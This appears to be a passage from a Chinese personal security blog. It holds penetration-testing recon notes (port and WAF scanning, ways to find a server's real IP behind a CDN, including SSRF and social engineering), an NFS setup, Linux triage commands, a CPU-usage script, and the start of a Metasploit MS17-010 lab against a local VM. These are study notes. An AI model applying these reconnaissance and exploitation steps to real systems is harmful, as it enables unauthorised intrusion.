alt="image-20240329193707328"></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、获取网络信息-服务厂商&amp;网络架构</p><p>2、获取服务信息-应用协议&amp;内网资产</p><p>不仅对一个ip扫描，可以获取该网段多个ip信息</p><p>然后<a href="https://www.cnblogs.com/wjw-zm/p/11803681.html">端口渗透</a></p><p>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><h2 id="详细点-2"><a href="#详细点-2" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>CDN服务，WAF防火墙，负载均衡，防火墙阻碍?</p><h3 id="相关利用项目"><a href="#相关利用项目" class="headerlink" title="#相关利用项目:"></a>#相关利用项目:</h3><p>Masscan: <a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p>Wafw00f：<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>Kali上自带Nmap，Masscan，1bd等项目，超级ping:ping.chinaz.com</p><p>Masscan:端口扫描，应用协议</p><p>wafw00f:web应用防护防火墙识别</p><p>Nmap:端口扫描，应用协议，防火墙识别</p><p>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p><p>在我们扫描时，有些服务器是由内网提供服务通过映射到外网来让我们访问，这样是扫不到内网的，只有外网，除非获得它的权限，不然是没办法的。</p><p>旁注:同服务器下面的不同WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com/">www.123.com</a> 目标没什么头绪</p><p><a href="http://www.124.com/">www.124.com</a> 那就从别的网站试试</p><p>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>10.1.1.1</p><p><a href="http://www.123.com只有一个网站,没什么头绪,我们就查10.1.1.0/24%E6%89%80%E6%9C%89%E7%9A%84%E7%BD%91%E6%AE%B5%E7%9A%84%E6%9C%8D%E5%8A%A1">www.123.com只有一个网站，没什么头绪，我们就查10.1.1.0/24所有的网段的服务</a></p><p>还有一种ip反查域名的手段</p><h1 id="Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件"><a href="#Day9：信息打点-CDN绕过篇-漏洞回链-接口探针-全网扫描-反向邮件" class="headerlink" title="Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件"></a>Day9：信息打点-CDN绕过篇_漏洞回链_接口探针_全网扫描_反向邮件</h1><ul><li>CDN知识-工作原理及阻碍</li><li>CDN配置-域名&amp;区域&amp;类型</li><li>CDN绕过-靠谱十余种技战法</li><li>CDN绑定-HOSTS绑定指向访问</li></ul><p>绕过知识点：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a></p><p>超级Ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p><p>本地绕过复现：<br>1、备案域名<br>2、开通CDN<br>3、配置CDN</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识:"></a>#前置知识:</h2><p>1.传统访问:用户访问域名-&gt;解析服务器P-&gt;访问目标主机</p><p>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机</p><p>3.带wAE的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p><h2 id="CDN配置"><a href="#CDN配置" class="headerlink" title="#CDN配置:"></a>#CDN配置:</h2><p>配置1:加速域名-需要启用加速的域名</p><p>配置2:加速区域-需要启用加速的地区</p><p>配置3:加速类型-需要启用加速的资源</p><h2 id="判定标准"><a href="#判定标准" class="headerlink" title="#判定标准:"></a>#判定标准:</h2><p>nslookup，各地ping(出现多个IP即启用CDN服务)</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>1.只加速一个域名<a href="http://www.xx.com,而test.xx.com没有加速/">www.xx.com，而test.xx.com没有加速</a></p><p>2.利用网站漏洞</p><p>3.历史DNS记录，之前没有CDN的历史记录</p><p>4.CDN本身，社工，得到控制面板</p><p>5.MS邮件</p><p>6.国外请求，加速区域在中国内地的时候，国外ip访问的就是真实id了</p><p>7.zmap</p><p>8.网络空间引擎搜索</p><p>演示:</p><p>真实应用-CDN绕过-漏洞&amp;遗留文件</p><p>pipinfo.php文件泄露（多个网卡就没什么用了）</p><p>SSRF:利用服务端访问相应的服务器，例如访问DNSlog，这个方法比较可靠，前提是要有相应的漏洞，当然不包括SSRF，类似的也行，只要能访问相关服务器的即可</p><p>真实应用-CDN绕过-子域名查询操作</p><p>用超级ping ping sp910网站，带www时会发现返回不同ip地址，说明用了CDN，而直接ping sp910.com时就会返回一样的ip</p><p>真实应用-CDN绕过-接口查询国外访问</p><p>一些网站有外国服务器ping对应域名可以得到真实ip，因为有些地方不太可能设置cdn</p><p>真实应用-CDN绕过-主动邮件配合备案</p><p>就是让对方发送邮件给你，比如网站找回密码时，可以看看对方发送给你邮件的邮件服务器，然后查看邮件原文即可</p><p><a href="http://get-site-ip.com/%E9%80%9A%E8%BF%87%E6%8E%A5%E5%8F%A3%E5%88%A4%E6%96%AD%EF%BC%8C%E4%B8%8D%E4%B8%80%E5%AE%9A%E6%AD%A3%E7%A1%AE%EF%BC%8C%E4%B8%8D%E6%8E%A8%E8%8D%90">http://get-site-ip.com/通过接口判断，不一定正确，不推荐</a></p><p>查网站备案可以验证结果</p><p>真实应用-CDN绕过-全网扫描FuckCDN</p><h2 id="hosts绑定ip"><a href="#hosts绑定ip" class="headerlink" title="hosts绑定ip"></a>hosts绑定ip</h2><p>编辑&#x2F;etc&#x2F;hosts文件，绑定ip，这样扫描就不会扫到别地方了</p><h1 id="Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#Day10：信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取"></a>Day10：信息打点-APP_小程序篇_抓包封包_XP框架_反编译_资产提取</h1><h2 id="知识点-7"><a href="#知识点-7" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、小程序-外在-资产收集</p><p>2、APP-外在&amp;内在-资产收集</p><p>appinfoscanner:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python app.py -i filpath</span><br></pre></td></tr></table></figure><p>APP-外在抓包-Fd&amp;茶杯&amp;Burp</p><p>APP-外在封包-封包监听工具</p><p>APP-内在提取-ApplnfoScanner</p><p>APP-内在搜索-反编译载入IDEA</p><p>APP-资源提取-安装包&amp;资源文件</p><p>APP-框架使用-Xposed&amp;JustTrustMe</p><p>小程序-微信-电脑版登录启动抓包分析</p><h1 id="Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔"><a href="#Day11：信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Arl灯塔" class="headerlink" title="Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔"></a>Day11：信息打点-红队工具篇_Fofa_Quake_Kunyu_Suize水泽_Arl灯塔</h1><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、网络空间四大引整-FofasQuakesshodan&amp;zoomeye</p><p>2、自动化信息收集项目-ARL灯塔ssuize水泽&amp;Kunyu坤舆</p><p>3、单点功能信息收集项目-企查:子域名s指纹识别&amp;社工信息</p><h2 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="#黑暗引擎:"></a>#黑暗引擎:</h2><p><a href="https://fofa.info/">https://fofa.info</a><br><a href="https://quake.360.cn/">https://quake.360.cn</a></p><p><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></p><p>搜索关联资产-特征资产-资产信息</p><h2 id="自动项目"><a href="#自动项目" class="headerlink" title="#自动项目:"></a>#自动项目:</h2><p><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a></p><p><a href="https://github.com/0x727/shuiZe_0x727">https://github.com/0x727/shuiZe_0x727</a></p><p><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>#相关资源:<br><a href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p><p>Finger配置相关信息在个人中心中查找，支FOFA和360QuakeKey，配置好后</p><ol><li>Finger追求极简命令参数只有以下几个:</li><li>-u 对单个URL进行指纹识别</li><li>-f对指定文件中的url进行批量指纹识别。</li><li>-i对ip进行fofa数据查询采集其web资产。</li><li>-if 对指定文件中的ip批量调用fofa进行数据查询采集其web资产</li><li>-fofa 调用fofa api进行资产收集</li><li>-quake 调用360 quake进行资产收集</li><li>-0指定输出方式默认不选择的话是xsx格式，支持json，xs。</li></ol><p>但finger好像用不了了，不懂怎么回事，还是用kunyu试试，安装时记得换源，或者加上</p><p><a href="https://blog.csdn.net/AD_CSY/article/details/119887450">https://blog.csdn.net/AD_CSY/article/details/119887450</a></p><p><a href="https://www.cnblogs.com/chenzhou2020/p/14207951.html">https://www.cnblogs.com/chenzhou2020/p/14207951.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、临时使用</span><br><span class="line"></span><br><span class="line">1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package</span><br><span class="line">2、永久更改pip源</span><br><span class="line"></span><br><span class="line">升级 pip 到最新的版本 (&gt;=10.0.0) 后进行配置：</span><br><span class="line"></span><br><span class="line">1 pip install pip -U</span><br><span class="line">2 pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">如果您到 pip 默认源的网络连接较差，临时使用镜像站来升级 pip：</span><br><span class="line"></span><br><span class="line">1 pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U</span><br></pre></td></tr></table></figure><p>报错可以去看看github相关的库，说不定pip下来的库少了几个文件。。。</p><p><a href="https://blog.csdn.net/wuqixiufen2/article/details/138408527">https://blog.csdn.net/wuqixiufen2/article/details/138408527</a></p><p>还有一种解决方法，创建python虚拟环境，debian下的更新pip好像不用python -m</p><p>换到了个windows10虚拟机，然后pip安装，在虚拟机中就顺利许多，python版本一致，但pip版本不一致，所以估计大部分报错都是pip版本问题，和一个ai的库对其它库的要求，所以导致pip install 失败</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NFS</title>
      <link href="/2024/05/27/NFS/"/>
      <url>/2024/05/27/NFS/</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置（巨难搞）"><a href="#环境配置（巨难搞）" class="headerlink" title="环境配置（巨难搞）"></a>环境配置（巨难搞）</h1><p>你普通的yum install dnf后，执行命令可能会出现段错误，这我觉得可能版本太旧了，dmesg会发现出现在python2.7.5,试着更新下源，结果一个错误解决又出现另一个错误。。。</p><p><a href="https://ipcmen.com/dnf">https://ipcmen.com/dnf</a></p><p><a href="https://blog.csdn.net/GX_1_11_real/article/details/99670417">https://blog.csdn.net/GX_1_11_real/article/details/99670417</a></p><p><a href="https://blog.csdn.net/qq_34202873/article/details/117094056">https://blog.csdn.net/qq_34202873/article/details/117094056</a></p><p><a href="https://www.cnblogs.com/zgqbky/p/13036069.html">https://www.cnblogs.com/zgqbky/p/13036069.html</a></p><p>修改resolve.conf不够解决问题，需要继续在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33增加DNS</p><p>安装完成后，有个情况dnf的信息很少，因为有些东西没安装全，需要换源</p><p>换源的时候注意aliyun的镜像源里Centos-Base.repo需要把里面的$releaserver换成7，最好是把yum.reepos.d文件夹备份后，在重新创建个空文件，然后换源。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:%s/$releaserver/7/g   </span><br></pre></td></tr></table></figure><p>还有一点，如果你安装了docker，需要注意连docker的源一起换了，不然会报错</p><p><a href="https://blog.csdn.net/YouMing_Li/article/details/117375461">https://blog.csdn.net/YouMing_Li/article/details/117375461</a></p><p>通过这个方法可以解决，且同样要将$releaserver替换成7</p><p>换了好多的源，终于是安装成了，这时候会发现安装的dnf的体量比之前大</p><p>总结：</p><p>自己测试了，有些错误跟大家分享一下<br>①：没有dnf，直接yum install dnf发现dnf -version运行会出现段错误，搜索有些解决方法，可能太复杂看不懂，简单粗暴点就是重新装过，装的过程中发现，yum下载的dnf是旧版本的，你需要更新一下缓存，yum clean all；yum makecache或者yum update，然后再下载dnf会发现返回的信息变多了，这次估计是下对了<br>②：用yum下载那两个工具：一样的问题，也要重新获取缓存，不然会发现命令缺了一些<br>③：换源过程中，我用的是centos7，重新获取缓存时出现404错误，可能是你的&#x2F;etc&#x2F;yum.repos.d&#x2F;CentOS-Base.repo的文件有个$releaserver需要替换成7，在文件里:%s&#x2F;$releaserver&#x2F;7&#x2F;g,把它们替换即可<br>④：报host的错误：在&#x2F;etc&#x2F;sysconfig&#x2F;network-script&#x2F;ifcfg-ens33里添加新的dns</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>看这篇就可以<a href="https://blog.csdn.net/Dark_Tk/article/details/114100517">https://blog.csdn.net/Dark_Tk/article/details/114100517</a></p><p>centos:安装完相应的工具后，启动对应服务</p><p>客户端同样的配置</p><p>mount ip:path &#x2F;unbuntu的目录</p><p>df -Th</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.174.142:/home/youzipii/data nfs4       18G   15G  3.0G   84% /text</span><br></pre></td></tr></table></figure><p>最终测试u：</p><p>在centos的目录下创建text.txt写入hello</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost data]# touch text.txt</span><br><span class="line">[root@localhost data]# vim text.txt</span><br></pre></td></tr></table></figure><p>在ubuntu系统下查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@youzipii-virtual-machine:/text# cat text.txt </span><br><span class="line">hello</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux排查经验</title>
      <link href="/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/"/>
      <url>/2024/05/25/linux%E6%8E%92%E6%9F%A5%E7%BB%8F%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="2024-x2F-5-x2F-25"><a href="#2024-x2F-5-x2F-25" class="headerlink" title="2024&#x2F;5&#x2F;25"></a>2024&#x2F;5&#x2F;25</h1><p>文章来源: https:<em>&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;3015</em></p><h2 id="查CPU异常占用"><a href="#查CPU异常占用" class="headerlink" title="查CPU异常占用"></a>查CPU异常占用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">top -c -o %CPU</span><br></pre></td></tr></table></figure><p>显示了系统中所有进程的 CPU 使用率，并且按照使用率从高到低排序，有时候出现超过百分百也有可能是因为多核CPU0.</p><p>% cpu 是表示单核 cpu 的占用率, 而不是占用所有 cpu 的占用率。可以通过按1查看系统是否有多个CPU</p><p>查出异常程序就可以去查看设备管理器去看该进程运行历史记录</p><h2 id="查看pid对应的进程"><a href="#查看pid对应的进程" class="headerlink" title="查看pid对应的进程"></a>查看pid对应的进程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure><ul><li><code>a</code>：显示所有终端的进程。</li><li><code>u</code>：以用户易读的格式显示进程信息。</li><li><code>x</code>：显示没有控制终端的进程。</li></ul><p>如果你想要 <code>ps</code> 命令的输出按照 CPU 使用率排序，你可以使用 <code>sort</code> 命令来辅助排序，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux --sort=-%cpu</span><br></pre></td></tr></table></figure><h2 id="进入对应的PID查看具体路径信息"><a href="#进入对应的PID查看具体路径信息" class="headerlink" title="进入对应的PID查看具体路径信息"></a>进入对应的PID查看具体路径信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux | grep PID</span><br></pre></td></tr></table></figure><p>查到路径，可以拷贝相关文件分析，微步之类的，看是否是恶意远控陈旭等</p><h2 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h2><p>​Linux系统启动时会启动很多系统服务进程，这些系统服务进程没有控制终端，不能直接和用户交互。其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程(守护进程)不受用户登录注销的影响，它们一直在运行着。这种进程有一个名称叫守护进程(Daemon)。<br>​守护进程也被称为精灵进程，是运行在后台的一种特殊进程，它独立于控制终端并且周期性地执行某种任务或等待处理某些发生的事件。</p><h3 id="守护进程的特点"><a href="#守护进程的特点" class="headerlink" title="守护进程的特点"></a>守护进程的特点</h3><p>(1)在Linux中，每个系统与用户进行交流的界面成为终端，每一个从此终端开始运行的进程都会依附于这个终端，这个终端被称为这些进程的控制终端；</p><p>(2)当控制终端被关闭的时候，相应的进程都会自动关闭。但是守护进程却能突破这种限制，它脱离于终端并且在后台运行，(脱离终端的目的是为了避免进程在运行的过程中的信息在任何终端中显示并且进程也不会被任何终端所产生的终端信息所打断)，它从被执行的时候开始运转，直到整个系统关闭才退出(当然可以认为是杀死相应的守护进程)；</p><p>(3)如果想让某个进程不因为用户或中断或其他变化而影响，那么就必须把这个进程变成一个守护进程。</p><h3 id="如何杀死守护进程"><a href="#如何杀死守护进程" class="headerlink" title="如何杀死守护进程"></a>如何杀死守护进程</h3><p>1.首先</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps axj | grep 守护进程名字</span><br></pre></td></tr></table></figure><p>找到相应的守护进程，然后使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kill -9 守护进程名</span><br></pre></td></tr></table></figure><p>2.利用<code>ps -ef</code>命令查找相应的守护进程，再用<code>kill -9</code>命令将其杀死；</p><p>3.创建shell脚本对进程的启动、关闭、重启进行自动管理。</p><p>下面我们继续寻找守护进程<br>进一步排查，计划任务没有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure><h1 id="2024-x2F-6-x2F-5"><a href="#2024-x2F-6-x2F-5" class="headerlink" title="2024&#x2F;6&#x2F;5"></a>2024&#x2F;6&#x2F;5</h1><p>查看默认网关记录：route -n</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ route -n</span><br><span class="line">Kernel IP routing table</span><br><span class="line">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class="line">0.0.0.0         192.168.174.2   0.0.0.0         UG    0      0        0 ens33</span><br></pre></td></tr></table></figure><p>查看指定网卡的信息 ifconfig 网卡名字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig ens33</span><br></pre></td></tr></table></figure><p>查看当前使用的DNS信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ cat /etc/resolv.conf</span><br><span class="line"># Generated by NetworkManager</span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line">nameserver 114.114.114.114</span><br><span class="line">search localdomain</span><br></pre></td></tr></table></figure><p>查看主机名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost /]$ hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 排查 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个CPU平均使用率脚本</title>
      <link href="/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/"/>
      <url>/2024/05/21/%E4%B8%80%E4%B8%AACPU%E5%B9%B3%E5%9D%87%E4%BD%BF%E7%94%A8%E7%8E%87%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">PREV_TOTAL=0 <span class="comment">#存储CPU总时间</span></span><br><span class="line">PREV_IDLE=0 <span class="comment">#存储CPU空闲时间</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#读取CPU统计数据并累加到TOTAL变量</span></span><br><span class="line">CPU=($(sed -n <span class="string">&#x27;s/^cpu\s//p&#x27;</span> /proc/stat))</span><br><span class="line">IDLE=<span class="variable">$&#123;CPU[3]&#125;</span></span><br><span class="line">TOTAL=0</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> VALUE <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;CPU[@]:0:8&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">TOTAL=$((TOTAL+VALUE))</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#计算当前与上一次的CPU总时间差并4舍5入</span></span><br><span class="line">DIFF_IDLE=$((IDLE-PREV_IDLE))</span><br><span class="line">DIFF_TOTAL=$((TOTAL-PREV_TOTAL))</span><br><span class="line">DIFF_USAGE=$(((<span class="number">1000</span>*(DIFF_TOTAL-DIFF_IDLE)/DIFF_TOTAL+<span class="number">5</span>)/<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印使用率并更新变量以供下一次使用</span></span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">&quot;\rCPU: <span class="variable">$DIFF_USAGE</span>% \b\b&quot;</span></span><br><span class="line">PREV_TOTAL=<span class="string">&quot;<span class="variable">$TOTAL</span>&quot;</span></span><br><span class="line">PREV_IDLE=<span class="string">&quot;<span class="variable">$IDLE</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> 1</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>sed</code> 是一个流编辑器，用于对文本进行处理。命令 <code>sed -n &#39;s/^cpu\s//p&#39; /proc/stat</code> 的意思是：</p><ul><li><code>sed</code>: 调用流编辑器。</li><li><code>-n</code>: 告诉 <code>sed</code> 不要自动打印每一行。</li><li><code>&#39;s/^cpu\s//p&#39;</code>: 这是传递给 <code>sed</code> 的脚本。<ul><li><code>s</code>: 表示替换操作。</li><li><code>/^cpu\s//</code>: 这是替换的模式。<code>^</code> 表示行的开始，<code>cpu</code> 是要查找的字符串，<code>\s</code> 表示空白字符（如空格、制表符等），<code>//</code> 表示查找模式的结束。</li><li><code>p</code>: 表示打印（print）。</li></ul></li><li><code>/proc/stat</code>: 这是 <code>sed</code> 要处理的文件。<code>/proc/stat</code> 是一个伪文件系统，其中包含了系统的状态信息，包括 CPU 的使用情况。</li></ul><p>所以，这个命令的意思是：使用 <code>sed</code> 来处理 <code>/proc/stat</code> 文件，查找以 “cpu” 开头的行，然后删除这些行开头的 “cpu” 和随后的空白字符，并打印这些行。</p><p>通常，<code>/proc/stat</code> 中的 “cpu” 行会显示 CPU 的使用情况，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cpu  0 0 0 0 0 0 0 0 0 0</span><br><span class="line">cpu0 0 0 0 0 0 0 0 0 0</span><br><span class="line">cpu1 0 0 0 0 0 0 0 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>执行上述 <code>sed</code> 命令后，会打印出除去 “cpu” 和空白字符后的行，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">0 0 0 0 0 0 0 0 0 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这些数字分别表示用户空间占用 CPU 时间的比例、系统空间占用 CPU 时间的比例、空闲 CPU 时间的比例等。</p>]]></content>
      
      
      
        <tags>
            
            <tag> bash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝利用测试</title>
      <link href="/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/05/20/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><h2 id="综合渗透测试框架"><a href="#综合渗透测试框架" class="headerlink" title="综合渗透测试框架"></a>综合渗透测试框架</h2><ol><li>Auxiliary  辅助模块  为渗透测试信息搜集提供了大量的辅助模块支持</li><li>Exploits 攻击模块  利用发现的安全漏洞或配置弱点对远程目标系统 进行攻击，从而获得对远程目标系统访问权的代码组件。</li><li>Payload 攻击载荷模块   攻击成功后促使靶机运行的一段植入代码</li><li>Post 后渗透攻击模块 收集更多信息或进一步访问被利用的目标系统</li><li>Encoders   编码模块    将攻击载荷进行编码，来绕过防护软件拦截</li></ol><h2 id="初始化，不然内置的db-namp等指令用不了"><a href="#初始化，不然内置的db-namp等指令用不了" class="headerlink" title="初始化，不然内置的db_namp等指令用不了"></a>初始化，不然内置的db_namp等指令用不了</h2><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">开启数据库</span><br><span class="line">service postgresql start</span><br><span class="line">初始化数据库</span><br><span class="line">msfdb init</span><br><span class="line">开启控制台</span><br><span class="line">msfconsole</span><br><span class="line">查看数据库连接状态</span><br><span class="line">db_status</span><br></pre></td></tr></table></figure><h3 id="常用帮助指令"><a href="#常用帮助指令" class="headerlink" title="常用帮助指令"></a>常用帮助指令</h3><p>help&#x2F;?     帮助菜单</p><p>exit 退出MSF控制台</p><p>Back     返回上一级</p><p>info 显示一个或者多个模块的信息</p><p>show 显示所给类型的模块</p><p>background  将当前操作在后台运行</p><p>use  使用所选择的模块</p><p>set 设置选项</p><p>unset 取消设置的选项</p><p>session 会话，主要是多个目标，切换时可以选择</p><h2 id="Auxiliary模块：show-auxiliary"><a href="#Auxiliary模块：show-auxiliary" class="headerlink" title="Auxiliary模块：show auxiliary"></a>Auxiliary模块：show auxiliary</h2><p>命名规则:功能&#x2F;服务&#x2F;名称     scanner&#x2F;smb&#x2F;smb_ms17_010</p><h3 id="Exploits模块：show-exploits"><a href="#Exploits模块：show-exploits" class="headerlink" title="Exploits模块：show exploits"></a>Exploits模块：show exploits</h3><p>rank表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</p><p>命名规则:操作系统&#x2F;服务&#x2F;名称   windows&#x2F;smb&#x2F;ms17_010_eternalblue </p><h3 id="Payload-模块"><a href="#Payload-模块" class="headerlink" title="Payload 模块"></a>Payload 模块</h3><p>命名规则:操作系统&#x2F;类型&#x2F;名称   windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp </p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><strong>kali：192.168.174.137</strong></p><p><strong>靶机（win2008r2 x64）：192.168.174.157</strong></p><p><strong>phpstud</strong></p><p><strong>phpMyAdmin 4.8.x:CVE-2018-12613</strong> </p><p><strong>漏洞介绍</strong></p><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。</p><p><strong>漏洞描述</strong></p><p>在phpMyAdmin 4.8.x版本中，程序没有严格控制用户的输入，攻击者可以利用双重编码绕过程序的白名单限制，造成文件包含漏洞。</p><p><strong>受影响的系统版本</strong></p><p>phpMyAdmin 4.8.0</p><p>phpMyAdmin 4.8.1</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="根据名称搜索"><a href="#根据名称搜索" class="headerlink" title="根据名称搜索"></a>根据名称搜索</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search ms17</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line"><span class="meta prompt_">   # </span><span class="language-bash">  Name                                                  Disclosure Date  Rank     Check  Description</span></span><br><span class="line">   -   ----                                                  ---------------  ----     -----  -----------</span><br><span class="line">   0   exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-01</span><br></pre></td></tr></table></figure><h3 id="设置模块"><a href="#设置模块" class="headerlink" title="设置模块"></a>设置模块</h3><p>其中有exp和aux，我们先用aux进行扫描，看是否存在漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; </span><br><span class="line">也可以use+序号</span><br><span class="line">use 24</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting             Required  Description</span><br><span class="line">   ----         ---------------             --------  -----------</span><br><span class="line">   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts</span><br><span 